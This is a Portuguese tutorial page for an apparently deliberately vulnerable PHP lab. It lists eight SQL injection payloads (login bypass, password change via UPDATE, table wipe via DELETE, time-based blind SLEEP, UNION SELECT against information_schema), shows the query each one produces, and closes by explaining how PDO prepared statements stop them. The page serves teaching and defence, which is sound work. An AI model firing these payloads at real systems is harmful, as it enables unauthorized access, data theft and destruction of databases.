Payloads para testar

1. OR 1=1 — Bypass de Login
Testar em: login_vulneravel.php Campo: Email
Payload
' OR 1=1 --
Query gerada
SELECT * FROM usuarios WHERE email = '' OR 1=1 -- ' AND senha = ''

O ' fecha a string. O OR 1=1 é sempre verdadeiro. O -- comenta o restante, incluindo a verificação da senha. Qualquer conta é acessada sem saber a senha.

🔒 No login seguro (processa_login_seguro.php): o payload vira texto puro. A query nunca é alterada.
2. admin' -- — Ignorar Senha
Testar em: login_vulneravel.php Campo: Email
Payload
admin@gmail.com' --
Query gerada
SELECT * FROM usuarios WHERE email = 'admin@gmail.com' -- ' AND senha = ''

Aponta para um usuário específico e comenta a verificação de senha. Não precisa saber a senha do admin.

3. OR 'a'='a' — Comparação Sempre Verdadeira
Testar em: login_vulneravel.php Campo: Email
Payload
' OR 'a'='a
Query gerada
SELECT * FROM usuarios WHERE email = '' OR 'a'='a' AND senha = ''

Variação do OR 1=1. Útil quando filtros numéricos estão bloqueados mas comparações de string passam.

4. OR 1=1 na Busca — Exfiltrar Todos os Dados
Testar em: busca_vulneravel.php → resultado em: resultado_busca.php
Payload
' OR 1=1 --
Query gerada
SELECT * FROM usuarios WHERE email LIKE '%' OR 1=1 -- %'

Retorna todos os registros da tabela. Em sistemas reais, exporia dados de todos os usuários cadastrados.

5. OR 1=1 no DELETE — Apagar Tudo
Testar em: delete_vulneravel.php → processado em: processa_delete.php
Payload
1 OR 1=1
Query gerada
DELETE FROM usuarios WHERE id = 1 OR 1=1
⚠️ ATENÇÃO: esse ataque apaga TODOS os registros. Execute o setup.sql para restaurar os dados.

Um campo de ID sem proteção pode destruir toda a base de dados com uma única requisição.

6. Injeção no UPDATE — Alterar Campos Extras
Testar em: update_vulneravel.php → processado em: processa_update.php
Payload (campo email)
hacker@email.com', senha='123456
Query gerada
UPDATE usuarios SET email = 'hacker@email.com', senha='123456' WHERE id = 1

O atacante fecha a string e injeta um campo extra no SET, alterando a senha — um campo que o formulário nem exibe.

7. SLEEP — Blind SQL Injection (por tempo)
Testar em: login_vulneravel.php Campo: Email
Payload
' OR SLEEP(3) --
Query gerada
SELECT * FROM usuarios WHERE email = '' OR SLEEP(3) -- ' AND senha = ''

Se a página demorar ~3 segundos, o SQL foi executado. Prova a vulnerabilidade mesmo quando o sistema não exibe erros — técnica usada em Blind SQLi.

8. UNION SELECT — Puxar Dados de Outras Tabelas
Testar em: busca_vulneravel.php → resultado em: resultado_busca.php
Payload
' UNION SELECT 1, table_name, 3 FROM information_schema.tables --

Quando o número de colunas coincide, o UNION combina resultados de qualquer tabela do banco. Em produção, pode expor tabelas de cartões, tokens, senhas e mais.

🔑 Por que o PDO resolve tudo isso?

Com Prepared Statements, a query e os dados chegam ao banco separados. Não importa o que o usuário digitar — o banco nunca interpreta os dados como código SQL. O ' OR 1=1 -- vira literalmente a string ' OR 1=1 --, e a query falha normalmente como se fosse um email inválido qualquer.

"SQL Injection não é hack avançado. É erro básico de programação."
